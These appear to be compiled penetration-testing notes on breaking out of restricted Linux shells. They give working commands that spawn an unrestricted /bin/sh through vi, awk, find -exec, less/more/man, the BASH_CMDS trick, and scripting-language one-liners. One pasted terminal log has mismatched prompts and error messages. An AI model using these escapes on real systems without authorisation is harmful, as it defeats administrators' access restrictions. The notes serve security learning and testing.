Jailed Shell Escape

There is a lot of different restricted shells to choose from. Some of them are just normal shells with some simple common restrictions not actually configurable, such as rbash (restricited Bash), rzsh and rksh (Korn Shell in restricted mode), which are really trivial to bypass. Others have a complete configuration set that can be redesigned to fit administrator’s needs such as lshell (Limited Shell) and rssh (Restricted Secure Shell).

A Restricted Shell... What Is It?

It limits a user's ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:

    Using the 'cd' command to change directories.
    Setting or unsetting certain environment variables (i.e. SHELL, PATH, etc...).
    Specifying command names that contain slashes.
    Specifying a filename containing a slash as an argument to the '.' built-in command.
    Specifying a filename containing a slash as an argument to the '-p' option to the 'hash' built-in command.
    Importing function definitions from the shell environment at startup.
    Parsing the value of SHELLOPTS from the shell environment at startup.
    Redirecting output using the '>', '>|', ", '>&', '&>', and '>>' redirection operators.
    Using the 'exec' built-in to replace the shell with another command.
    Adding or deleting built-in commands with the '-f' and '-d' options to the enable built-in.
    Using the 'enable' built-in command to enable disabled shell built-ins.
    Specifying the '-p' option to the 'command' built-in.
    Turning off restricted mode with 'set +r' or 'set +o restricted'.
    
    Restrictions Implemented in rbash

    cd command (Change Directory)
    PATH (setting/ unsetting)
    ENV aka BASH_ENV (Environment Setting/ unsetting)
    Importing Function
    Specifying file name containing argument ‘/’
    Specifying file name containing argument ‘-‘
    Redirecting output using ‘>‘, ‘>>‘, ‘>|‘, ‘<>‘, ‘>&‘, ‘&>‘
    turning off restriction using ‘set +r‘ or ‘set +o‘
https://www.tecmint.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/
    https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ 
    
    
A way escape rbash
2018-02-16 / views: 302

hacker@beta:~$ ls
-rbash: /usr/bin/python: restricted: cannot specify `/' in command names
ryuu@beta:~$ 
hacker@beta:~$ whoami
-rbash: /usr/bin/python: restricted: cannot specify `/' in command names

hacker@beta:~$ BASH_CMDS[a]=/bin/sh;a 

$ /bin/bash
bash: groups: command not found
hacker@beta:~$ export PATH=$PATH:/bin/
hacker@beta:~$ export PATH=$PATH:/usr/bin
    https://hk.saowen.com/a/fdc328ee0d838a7a3598aa5c462528baed2059e624dcda633b736a3b0337223c 
    
    
    Editors

One of the most well documented techniques is to spawn a shell from within an editor such as 'vi' or 'vim'. Open any file using one of these editors and type the following and execute it from within the editor:

:set shell=/bin/bash

Next, type and execute:

:shell

Another method is to type:

:! /bin/bash

If either of these works, you will have an unrestricted shell from within the editor. Most modern restricted shells already defend against this hack, but it's always worth a shot. You may be working from a restricted editor such as rvi or rvim, which will almost certainly stop a shell from spawning. Also, try different shells with this technique and ones that follow as some restricted shells may block 'sh' or 'bash'.

Awk Command

If you can run 'awk', you can attempt to execute a shell from within it.

Type the following:

awk 'BEGIN {system("/bin/sh")}'

If successful, you'll see an unrestricted shell prompt!

Find Command

If the 'find' command is present, you can attempt to use the '-exec' function within it.

Type the following:

find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

Again, if successful, you'll see a blinking cursor at an unrestricted shell prompt! Note that in the above example, you are able to call the 'awk' command even if it is not present in our PATH. This is important because you are able to bypass the restriction of only being permitted to execute commands in your PATH. You are not limited to the 'awk' command.

More, Less, and Man Commands

There is a known escape within these commands. After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file:

'! /bin/sh'
'!/bin/sh'
'!bash'

Like the shell escape in 'awk' and 'find', if successful, you'll be sitting at an unrestricted shell prompt. Note you can try different shells, and the space after the '!' may not matter.

Tee Command

If you do not have access to an editor, and would like to create a script, you can make use of the 'tee' command. Since you cannot make use of '>' or '>>', the 'tee' command can help you direct your output when used in tandem with the 'echo' command. This is not a shell escape in of itself, but consider the following:

echo "evil script code" | tee script.sh

You will be able to create a file called script.sh in your home directory and add your script code to the file. Once the file is created, use the 'tee -a' option for all subsequent commands as the '-a' allows you to append to the file rather than overwrite the file.
Favorite Language?

Try invoking a SHELL through your favorite language:

    python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
    perl -e 'exec "/bin/sh";'
    perl: exec "/bin/sh";
    ruby: exec "/bin/sh"
    lua: os.execute('/bin/sh')
    irb(main:001:0> exec "/bin/sh"


    
    http://netsec.ws/?p=337
    https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
    https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
    http://airnesstheman.blogspot.ca/2011/05/breaking-out-of-jail-restricted-shell.html
    http://securebean.blogspot.ca/2014/05/escaping-restricted-shell_3.html
    https://github.com/infodox/python-pty-shells
    https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
